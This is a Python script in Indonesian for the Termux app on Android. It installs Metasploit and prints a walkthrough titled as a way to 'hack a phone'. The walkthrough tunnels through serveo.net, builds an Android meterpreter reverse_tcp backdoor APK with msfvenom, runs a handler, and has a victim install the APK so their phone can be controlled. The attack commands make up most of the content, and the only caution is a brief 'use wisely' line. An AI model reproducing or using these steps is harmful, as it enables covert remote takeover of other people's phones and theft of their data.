import os
import sys
import time

b = '\033[34;1m'
g = '\033[32;1m'
p = '\033[35;1m'
c = '\033[36;1m'
r = '\033[31;1m'
w = '\033[37;1m'
y = '\033[33;1m'

os.system('figlet METASPLOIT')


print ('\033[31;1m[==============================================]')
print ('\033[31;1m[               Author : Insan Gans            ]')
print ('\033[31;1m[             Team : FRI3NDS CYBER ARMY        ]')
print ('\033[31;1m[             Contact Me : 081212683289        ]')
print ('\033[31;1m[             Thanks To Leader MOBM TEAM       ]')
print ('\033[31;1m[==============================================]')
print('')
time.sleep(1)



isinya = '''
{1} Install Bahan-Bahannya Gan

{2} Cara Menggunakannya

{3} Kirim Pesan Ke Busted'''
print(isinya)
print('')
time.sleep(1)
insangans = input('Silahkan Pilih Ya Asw >>  ')
print('')


if insangans =='1':
    print('\033[32;1mNote : Gunakan Dengan Bijak Ya Panteq')
    time.sleep(3)
    os.system('pkg update && pkg upgrade -y')
    os.system('pkg install pkg install unstable-repo -y')
    os.system('pkg install metasploit -y')
    os.system('pkg install openssh')
    os.system('termux-setup-storage')
    time.sleep(3)
    print('Penginstallan Sudah Selesai.....')
    time.sleep(3)

elif insangans =='2':
    print ('\033[31;1m====================================================================')
    print('\033[32;1mJika Sudah Kalian Install Bahan Bahannya')
    print('')
    time.sleep(1)
    print('Kalian Ketik ssh -R (terserah port nya mau berapa) contohnya ssh -R 5454:localhost:5454 serveo.net')
    time.sleep(1)
    print('')
    print('jika sudah Buka season baru lalu ketik ping serveo.net nah kalo muncul ip addres dari ping serveo.net tadi kalian salin')
    time.sleep(1)
    print('Kalo Udah Tinggal Kaliam Buat backdoor nya dengan cara buka season baru lalu ketik')
    print('')
    print('./msfvenom -p android meterpreter/reverse_tcp lhost=(isi IP dari ping serveo tdi) lport=(tergantung port yg anda pilih) -R /sdcard/termux.apk (nama apk nya terserah kalian')
    print('')
    print('kalo udah tinggal kalian tunggu, lalu kalian buka season baru lagi lalu ketik')
    print('')
    print('msfconsole')
    time.sleep(1)
    print('kalo udah kalian ketik')
    print('')
    time.sleep(1)
    print('use exploit/multi/handler')
    print('set payload android/meterpreter/reverse_tcp')
    print('set lhost 127.0.0.1')
    print('set lport 5454(lport yg tadi kamu gunakan")')
    print('run')
    time.sleep(1)
    print('')
    print('nah udh berhasil tinggal kalian suruh korban Install backdoor kalian lalu kalian akses hape korban')
    print('kalo korban sudah menginstall Tinggal Kalian cek di termux nya lalu kalian ketik')
    print('')
    time.sleep(1)
    print('help')
    print('Oke Itulah Cara Hack Hape With Metasploit Ingat Gunakan Dengan Bijak Ya Syg:/')
    time.sleep(1)

elif insangans =='3':
  os.system('termux-open-url https://api.whatsapp.com/send?phone=6281212683289')


else :
  print('YANG ANDA CARI TIDAK ADA')
